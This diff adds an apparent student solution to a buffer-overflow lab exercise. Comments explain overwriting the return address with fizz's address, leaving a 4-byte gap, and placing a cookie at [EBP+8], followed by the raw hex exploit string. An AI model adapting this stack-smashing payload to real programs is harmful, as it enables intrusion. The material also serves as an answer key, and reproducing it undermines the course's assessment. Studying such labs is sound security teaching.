@@ -1,0 +1,5 @@
+/* I need to set fizz_Func address and my cookie in order, the prior 48 bytes value is the same as before */
+/* Important: Set "4 bytes gaps" between fizz_Func address and my cookie, the 4 bytes gap's value is arbitrary */
+/* because fizz() process also need to "push %ebp", so I need set "4 bytes gaps" between fizz_Func address and my cookie in case of overwrite */
+/* My cookie is stored at [EBP+8] */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ba 8c 04 08 00 00 00 00 30 73 8e 11
